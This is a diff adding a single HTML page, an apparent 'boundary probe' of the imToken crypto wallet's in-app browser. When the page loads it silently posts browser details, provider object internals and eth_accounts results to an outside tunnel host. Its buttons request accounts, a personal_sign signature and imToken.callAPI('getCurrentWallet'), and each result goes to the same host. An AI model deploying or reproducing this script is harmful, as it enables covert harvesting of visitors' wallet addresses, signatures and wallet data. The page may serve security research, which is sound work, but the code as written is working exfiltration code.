@@ -1,0 +1,28 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>imToken provider boundary probe</title>
+<style>
+body{font:16px system-ui;margin:18px;background:#10151c;color:#edf4ff}button,input{font:inherit;padding:12px;margin:6px 0;width:100%}pre{white-space:pre-wrap;word-break:break-word;background:#1c2633;padding:12px;border-radius:8px}.ok{color:#72f5a0}.err{color:#ff7f91}
+</style>
+<h2>imToken provider boundary probe</h2>
+<div id="status">Loading…</div>
+<button id="accounts">Request accounts</button>
+<button id="sign">Request personal_sign canary</button>
+<button id="api">Probe imToken.callAPI</button>
+<pre id="out"></pre>
+<script>
+const out=document.querySelector('#out');
+const lines=[];
+function serial(v){try{return JSON.stringify(v,(_,x)=>typeof x==='bigint'?String(x):x)}catch(e){return String(v)}}
+async function report(kind,value){const row={kind,value,time:new Date().toISOString(),href:location.href,origin:location.origin,top:self===top};lines.push(row);out.textContent=lines.map(x=>x.kind+': '+serial(x.value)).join('\n');try{await fetch('https://purple-drinks-see.loca.lt/collect',{method:'POST',mode:'no-cors',credentials:'omit',headers:{'content-type':'text/plain'},body:JSON.stringify(row),keepalive:true})}catch(e){}}
+function describe(name,obj){if(!obj)return null;let proto;try{proto=Object.getOwnPropertyNames(Object.getPrototypeOf(obj)||{})}catch(e){proto=['ERR:'+e]};let own;try{own=Object.getOwnPropertyNames(obj)}catch(e){own=['ERR:'+e]};return {name,type:typeof obj,own,proto}}
+addEventListener('load',async()=>{
+  document.querySelector('#status').innerHTML='<span class="ok">Loaded in '+location.origin+'</span>';
+  await report('environment',{ua:navigator.userAgent,referrer:document.referrer,ethereum:describe('ethereum',window.ethereum),imToken:describe('imToken',window.imToken),web3:describe('web3',window.web3)});
+  if(window.ethereum?.request){try{await report('eth_accounts',await ethereum.request({method:'eth_accounts'}))}catch(e){await report('eth_accounts_error',{message:e.message,code:e.code})}}
+});
+document.querySelector('#accounts').onclick=async()=>{try{await report('eth_requestAccounts',await ethereum.request({method:'eth_requestAccounts'}))}catch(e){await report('eth_requestAccounts_error',{message:e.message,code:e.code})}};
+document.querySelector('#sign').onclick=async()=>{try{const a=await ethereum.request({method:'eth_accounts'});await report('personal_sign',await ethereum.request({method:'personal_sign',params:['imToken security canary '+Date.now(),a[0]]}))}catch(e){await report('personal_sign_error',{message:e.message,code:e.code})}};
+document.querySelector('#api').onclick=async()=>{try{await report('callAPI_result',await window.imToken.callAPI('getCurrentWallet'))}catch(e){await report('callAPI_error',{message:e.message,stack:e.stack})}};
+</script>
